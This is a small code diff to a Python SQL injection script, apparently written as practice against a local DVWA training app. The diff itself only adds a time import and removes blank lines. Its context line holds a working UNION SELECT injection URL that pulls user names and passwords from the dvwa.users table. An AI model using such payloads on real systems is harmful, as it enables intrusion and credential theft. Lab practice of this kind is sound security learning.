@@ -1,4 +1,5 @@
 import requests
+import time
 import re
 
 
@@ -66,8 +67,6 @@ class HandleSqlInjectionExp(object):
         #获取最终用户名密码数据
         info = self.sql_injection_session.get(url="http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=1%27+union+select+user%2Cpassword+from+dvwa.users%23&Submit=Submit#",headers=self.header)
         print(info.text)
-
-
 
 
 if __name__ == '__main__':
